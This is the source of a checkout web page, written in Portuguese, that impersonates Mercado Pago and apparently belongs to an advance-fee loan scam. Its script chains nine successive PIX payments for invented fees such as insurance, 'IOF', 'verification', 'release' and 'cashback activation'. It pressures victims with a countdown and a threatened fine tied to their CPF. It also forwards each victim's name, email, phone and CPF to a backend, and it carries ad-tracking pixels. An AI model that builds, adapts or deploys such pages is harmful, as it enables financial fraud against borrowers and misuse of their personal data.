<!DOCTYPE html>
<html lang="pt-BR">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento</title>


<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
<script>
  window.tikTokPixelId = "6917a5ff97e4b1e2a6541a7a";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
  document.head.appendChild(a);
</script>
<!-- TikTok Pixel Code Start -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


  ttq.load('D4BQAE3C77UD6NKP6AK0');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- TikTok Pixel Code End -->



    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'mp-blue': '#009EE3',
                        'mp-dark-blue': '#0074A8',
                        'mp-light-blue': '#E6F7FF',
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
        body { min-height: 100vh; display: flex; flex-direction: column; }
        main { flex: 1; }
        .fade-in { animation: fadeIn 0.5s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .pulse-animation { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
        @keyframes pulseScale { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        .pulse-scale { animation: pulseScale 1s infinite; }
    </style>
</head>
<body class="bg-gray-50">
    <header class="bg-[#FFE600] border-b border-[#E6CF00] shadow-sm">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-20">
                <div class="flex items-center">
                    <img src="logo.png" alt="Mercado Pago" class="h-12 md:h-14">
                </div>
            </div>
        </div>
    </header>

    <main class="py-8 px-4 md:py-12">
        <div class="max-w-2xl mx-auto">
            <div id="loading" class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in text-center">
                <div class="animate-spin rounded-full h-16 w-16 border-b-2 border-mp-blue mx-auto mb-4"></div>
                <h2 class="text-xl font-bold text-gray-900 mb-2">Gerando PIX...</h2>
                <p class="text-gray-600">Aguarde um momento</p>
            </div>

            <div id="payment" class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in hidden">
                <div id="alertMessage" class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                    <div class="flex">
                        <svg class="h-5 w-5 text-red-400 mt-0.5" viewBox="0 0 20 20" fill="currentColor">
                            <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
                        </svg>
                        <div class="ml-3">
                            <p class="text-sm font-semibold text-red-800">Atenção</p>
                            <p class="text-sm text-red-700 mt-1" id="alertText"></p>
                        </div>
                    </div>
                </div>

                <div class="text-center mb-8">
                    <div class="inline-flex items-center gap-3 bg-green-100 text-green-800 px-4 py-2 rounded-full text-sm font-semibold mb-4">
                        <span>Aguardando pagamento</span>
                        <span class="text-xs opacity-75">•</span>
                        <span class="font-mono" id="countdown">30:00</span>
                    </div>
                    <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Finalize o pagamento</h1>
                    <p class="text-gray-600">Utilize o PIX para concluir o pagamento</p>
                </div>

                <div class="bg-mp-light-blue border border-mp-blue/30 rounded-xl p-6 mb-6 text-center">
                    <div class="text-sm font-medium text-gray-700 mb-2">Valor a pagar</div>
                    <div class="text-4xl font-bold text-gray-900 mb-1" id="amountDisplay">R$ 0,00</div>
                    <div class="text-sm text-gray-600" id="productName"></div>
                </div>

                <div class="mb-6">
                    <h3 class="font-semibold text-gray-900 mb-4 text-center">Escaneie o QR Code</h3>
                    <div class="bg-white border-2 border-gray-200 rounded-xl p-6 max-w-xs mx-auto">
                        <img id="qrcode" src="" alt="QR Code PIX" class="w-full h-auto">
                    </div>
                    <p class="text-center text-sm text-gray-600 mt-4">
                        Abra o app do seu banco e escaneie o código acima
                    </p>
                </div>

                <div class="relative my-8">
                    <div class="absolute inset-0 flex items-center">
                        <div class="w-full border-t border-gray-200"></div>
                    </div>
                    <div class="relative flex justify-center text-sm">
                        <span class="px-4 bg-white text-gray-500">ou</span>
                    </div>
                </div>

                <div class="mb-6">
                    <h3 class="font-semibold text-gray-900 mb-4">Pagar com PIX Copia e Cola</h3>
                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-4">
                        <label class="block text-sm font-medium text-gray-700 mb-2">PIX Copia e Cola</label>
                        <div class="flex gap-2 mb-3">
                            <input type="text" id="pixKey" readonly value="" class="flex-1 px-4 py-3 border border-gray-300 rounded-lg bg-white text-sm font-mono text-gray-700 focus:outline-none focus:border-mp-blue">
                            <button onclick="copyPixKey()" id="copyBtn" class="px-6 py-3 bg-mp-blue text-white rounded-lg font-semibold hover:bg-mp-dark-blue transition-all whitespace-nowrap">
                                Copiar
                            </button>
                        </div>
                        <p class="text-xs text-gray-600 mb-3">Cole esta chave no seu aplicativo bancário para realizar o pagamento</p>

                        <button onclick="manualCheck()" id="checkBtn" class="w-full bg-green-600 text-white py-3 rounded-lg font-semibold hover:bg-green-700 transition-all flex items-center justify-center gap-2">
                            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                            </svg>
                            Verificar Pagamento
                        </button>
                    </div>
                </div>

                <div class="bg-gray-50 rounded-xl p-6 mb-6">
                    <h3 class="font-semibold text-gray-900 mb-6 text-center">Instruções para pagamento</h3>

                    <div class="space-y-6">
                        <div class="flex gap-4 items-center">
                            <div class="flex-shrink-0">
                                <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center">
                                    <svg class="w-6 h-6 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                                        <path d="M3 1a1 1 0 000 2h1.22l.305 1.222a.997.997 0 00.01.042l1.358 5.43-.893.892C3.74 11.846 4.632 14 6.414 14H15a1 1 0 000-2H6.414l1-1H14a1 1 0 00.894-.553l3-6A1 1 0 0017 3H6.28l-.31-1.243A1 1 0 005 1H3zM16 16.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0zM6.5 18a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"/>
                                    </svg>
                                </div>
                            </div>
                            <div class="flex-1">
                                <p class="text-sm text-gray-700 leading-relaxed">
                                    Após copiar o código, abra seu aplicativo de pagamento onde você utiliza o Pix.
                                </p>
                            </div>
                        </div>

                        <div class="flex gap-4 items-center">
                            <div class="flex-shrink-0">
                                <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center">
                                    <svg class="w-6 h-6 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M3 4a1 1 0 011-1h3a1 1 0 011 1v3a1 1 0 01-1 1H4a1 1 0 01-1-1V4zm2 2V5h1v1H5zM3 13a1 1 0 011-1h3a1 1 0 011 1v3a1 1 0 01-1 1H4a1 1 0 01-1-1v-3zm2 2v-1h1v1H5zM13 3a1 1 0 00-1 1v3a1 1 0 001 1h3a1 1 0 001-1V4a1 1 0 00-1-1h-3zm1 2v1h1V5h-1z" clip-rule="evenodd"/>
                                        <path d="M11 4a1 1 0 10-2 0v1a1 1 0 002 0V4zM10 7a1 1 0 011 1v1h2a1 1 0 110 2h-3a1 1 0 01-1-1V8a1 1 0 011-1zM16 9a1 1 0 100 2 1 1 0 000-2zM9 13a1 1 0 011-1h1a1 1 0 110 2v2a1 1 0 11-2 0v-3zM7 11a1 1 0 100-2H4a1 1 0 100 2h3zM17 13a1 1 0 01-1 1h-2a1 1 0 110-2h2a1 1 0 011 1zM16 17a1 1 0 100-2h-3a1 1 0 100 2h3z"/>
                                    </svg>
                                </div>
                            </div>
                            <div class="flex-1">
                                <p class="text-sm text-gray-700 leading-relaxed">
                                    Escolha a opção <strong>PIX Copia e Cola</strong> e insira o código copiado.
                                </p>
                            </div>
                        </div>

                        <div class="flex gap-4 items-center">
                            <div class="flex-shrink-0">
                                <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center">
                                    <svg class="w-6 h-6 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                                    </svg>
                                </div>
                            </div>
                            <div class="flex-1">
                                <p class="text-sm text-gray-700 leading-relaxed">
                                    Confirme as informações e finalize o pagamento.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="flex items-center justify-center gap-2 p-3 bg-gray-50 rounded-lg border border-gray-200">
                    <svg class="w-5 h-5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                    </svg>
                    <span class="text-sm font-semibold text-gray-700">Ambiente Seguro</span>
                    <span class="text-xs text-gray-500">| Criptografia SSL 256-bit</span>
                </div>
            </div>

            <div id="error" class="bg-white rounded-2xl shadow-sm border border-red-200 p-6 md:p-8 fade-in hidden">
                <div class="text-center">
                    <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg class="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
                        </svg>
                    </div>
                    <h2 class="text-xl font-bold text-gray-900 mb-2">Erro ao gerar PIX</h2>
                    <p class="text-gray-600 mb-4" id="errorMsg">Ocorreu um erro. Tente novamente.</p>
                    <button onclick="location.reload()" class="px-6 py-3 bg-mp-blue text-white rounded-lg font-semibold hover:bg-mp-dark-blue transition-all">
                        Tentar novamente
                    </button>
                </div>
            </div>
        </div>
    </main>

    <footer class="bg-[#FFE600] border-t border-[#E6CF00] mt-auto">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
            <div class="flex flex-col items-center justify-center text-center space-y-4">
                <img src="logo.png" alt="Mercado Pago" class="h-10 md:h-12">
                <div class="text-sm text-gray-900 space-y-1">
                    <p>© 2025 Mercado Pago - Instituição de Pagamento</p>
                    <p>CNPJ: 10.573.521/0001-91</p>
                </div>
            </div>
        </div>
    </footer>

    <script>
        let transactionId = null;
        let checkInterval = null;
        let currentStep = '';
        let countdownTime = 1800;
        let countdownInterval = null;

        const stepConfig = {
            'front': {
                amount: 29.97,
                name: 'Seguro Prestamista Porto Seguro',
                alert: 'Este pagamento só pode ser realizado dentro do tempo estimado. Após este período, caso o pagamento não for confirmado, sua solicitação será cancelada. (Desistência gera multa de R$226,39 vinculada ao seu CPF, conforme os Termos de Uso)',
                nextUrl: 'upsells/1/index.html'
            },
            'up1': {
                amount: 27.82,
                name: 'Taxa IOF - Imposto sobre Operações Financeiras',
                alert: 'Pagamento da taxa IOF obrigatória para conformidade com o Banco Central. O não pagamento resulta no cancelamento do contrato do empréstimo.',
                nextUrl: 'upsells/2/index.html'
            },
            'up2': {
                amount: 18.91,
                name: 'Taxa de Verificação de IOF',
                alert: 'Taxa de verificação de IOF para validação da operação. Esta taxa garante conformidade com as políticas da emissora.',
                nextUrl: 'upsells/3/index.html'
            },
            'up3': {
                amount: 26.41,
                name: 'Taxa de Liberação Final',
                alert: 'Taxa de liberação final para ativação do crédito em sua conta. Última verificação de titularidade necessária.',
                nextUrl: 'upsells/4/index.html'
            },
            'up4': {
                amount: 33.43,
                name: 'Ativação de Cashback',
                alert: 'Ativação do cashback para receber o valor total do empréstimo. Necessário para liberar R$ 4.730,35 em sua conta.',
                nextUrl: 'upsells/5/index.html'
            },
            'up5': {
                amount: 29.90,
                name: 'Antecipação Express',
                alert: 'Antecipação Express para receber o empréstimo em 5 minutos ao invés de esperar 7 dias úteis.',
                nextUrl: 'upsells/6/index.html'
            },
            'up6': {
                amount: 14.06,
                name: 'Taxa de Processamento - Valor Adicional',
                alert: 'Taxa de processamento para liberação do valor adicional de R$ 20.000,00 pré-aprovado exclusivo para você.',
                nextUrl: 'upsells/7/index.html'
            },
            'up7': {
                amount: 16.92,
                name: 'Taxa de Abertura de Crédito (TAC)',
                alert: 'Taxa de Abertura de Crédito (TAC) obrigatória. O não pagamento desta taxa impede a liberação do crédito aprovado.',
                nextUrl: 'upsells/8/index.html'
            },
            'up8': {
                amount: 31.92,
                name: 'Taxa de Processamento Administrativo',
                alert: 'Taxa de Processamento Administrativo - última etapa. O não pagamento impede a conclusão do processo.',
                nextUrl: '12.php'
            }
        };

        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                step: params.get('step') || 'front',
                nome: params.get('nome') || '',
                email: params.get('email') || '',
                telefone: params.get('telefone') || '',
                cpf: params.get('cpf') || ''
            };
        }

        function getUtmParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                utm_source: params.get('utm_source') || '',
                utm_medium: params.get('utm_medium') || '',
                utm_campaign: params.get('utm_campaign') || '',
                utm_content: params.get('utm_content') || '',
                utm_term: params.get('utm_term') || ''
            };
        }

        async function createTransaction() {
            const urlParams = getUrlParams();
            const utmParams = getUtmParams();
            currentStep = urlParams.step;

            const config = stepConfig[currentStep];
            if (!config) {
                showError('Configuração inválida');
                return;
            }

            document.getElementById('amountDisplay').textContent = `R$ ${config.amount.toFixed(2).replace('.', ',')}`;
            document.getElementById('productName').textContent = config.name;
            document.getElementById('alertText').textContent = config.alert;

            const data = {
                step: currentStep,
                amount: config.amount,
                product_name: config.name,
                nome: urlParams.nome,
                email: urlParams.email,
                telefone: urlParams.telefone,
                cpf: urlParams.cpf,
                ...utmParams
            };

            try {
                const response = await fetch('create.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                const result = await response.json();

                if (result.success) {
                    transactionId = result.transaction_id;
                    document.getElementById('qrcode').src = result.qrcode;
                    document.getElementById('pixKey').value = result.pix_key;
                    document.getElementById('loading').classList.add('hidden');
                    document.getElementById('payment').classList.remove('hidden');
                    startCountdown();
                    startChecking();
                } else {
                    showError(result.message || 'Erro ao criar transação');
                }
            } catch (error) {
                console.error('Erro:', error);
                showError('Erro de conexão. Verifique sua internet e tente novamente.');
            }
        }

        function startCountdown() {
            const countdownEl = document.getElementById('countdown');
            const badge = countdownEl.closest('.inline-flex');

            countdownInterval = setInterval(() => {
                countdownTime--;

                const minutes = Math.floor(countdownTime / 60);
                const seconds = countdownTime % 60;

                countdownEl.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;

                if (countdownTime <= 300 && countdownTime > 0) {
                    badge.classList.remove('bg-green-100', 'text-green-800');
                    badge.classList.add('bg-red-100', 'text-red-800');
                    countdownEl.classList.add('pulse-scale');
                }

                if (countdownTime <= 0) {
                    clearInterval(countdownInterval);
                    clearInterval(checkInterval);
                    countdownEl.textContent = 'EXPIRADO';
                    countdownEl.classList.remove('pulse-scale');
                    badge.classList.remove('bg-green-100', 'text-green-800', 'bg-red-100', 'text-red-800');
                    badge.classList.add('bg-gray-100', 'text-gray-800');
                    showError('O tempo para pagamento expirou. Por favor, gere um novo PIX.');
                }
            }, 1000);
        }

        function startChecking() {
            checkInterval = setInterval(async () => {
                await checkPaymentStatus();
            }, 5000);
        }

        async function checkPaymentStatus() {
            try {
                const response = await fetch(`check.php?id=${transactionId}&step=${currentStep}`);
                const result = await response.json();

                if (result.status === 'paid') {
                    clearInterval(checkInterval);
                    clearInterval(countdownInterval);
                    window.location.href = result.next_url;
                }
            } catch (error) {
                console.error('Erro ao verificar status:', error);
            }
        }

        async function manualCheck() {
            const checkBtn = document.getElementById('checkBtn');
            const originalText = checkBtn.innerHTML;

            checkBtn.disabled = true;
            checkBtn.innerHTML = '<svg class="animate-spin h-5 w-5 mx-auto" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>';

            try {
                const response = await fetch(`check.php?id=${transactionId}&step=${currentStep}`);
                const result = await response.json();

                if (result.status === 'paid') {
                    clearInterval(checkInterval);
                    clearInterval(countdownInterval);

                    checkBtn.innerHTML = '<svg class="w-5 h-5 mx-auto" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg> Pagamento Confirmado!';

                    setTimeout(() => {
                        window.location.href = result.next_url;
                    }, 1000);
                } else {
                    checkBtn.innerHTML = '<svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"/></svg><span>Aguardando...</span>';
                    checkBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
                    checkBtn.classList.add('bg-amber-500', 'hover:bg-amber-600');

                    setTimeout(() => {
                        checkBtn.innerHTML = '<svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg><span>Verificar Pagamento</span>';
                        checkBtn.classList.remove('bg-amber-500', 'hover:bg-amber-600');
                        checkBtn.classList.add('bg-green-600', 'hover:bg-green-700');
                        checkBtn.disabled = false;
                    }, 2000);
                }
            } catch (error) {
                console.error('Erro ao verificar:', error);
                checkBtn.innerHTML = originalText;
                checkBtn.disabled = false;

                alert('Erro ao verificar pagamento. Tente novamente.');
            }
        }

        function showError(message) {
            if (checkInterval) clearInterval(checkInterval);
            if (countdownInterval) clearInterval(countdownInterval);
            document.getElementById('loading').classList.add('hidden');
            document.getElementById('payment').classList.add('hidden');
            document.getElementById('error').classList.remove('hidden');
            document.getElementById('errorMsg').textContent = message;
        }

        function copyPixKey() {
            const pixKeyInput = document.getElementById('pixKey');
            const copyBtn = document.getElementById('copyBtn');

            pixKeyInput.select();
            pixKeyInput.setSelectionRange(0, 99999);

            navigator.clipboard.writeText(pixKeyInput.value).then(() => {
                const originalText = copyBtn.innerHTML;
                copyBtn.innerHTML = '<svg class="w-5 h-5 mx-auto" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>';
                copyBtn.classList.remove('bg-mp-blue', 'hover:bg-mp-dark-blue');
                copyBtn.classList.add('bg-green-600', 'hover:bg-green-700');

                setTimeout(() => {
                    copyBtn.innerHTML = originalText;
                    copyBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
                    copyBtn.classList.add('bg-mp-blue', 'hover:bg-mp-dark-blue');
                }, 2000);
            }).catch(err => {
                alert('Erro ao copiar a chave PIX. Tente novamente.');
            });
        }

        window.onload = createTransaction;
    </script>
</body>
</html>
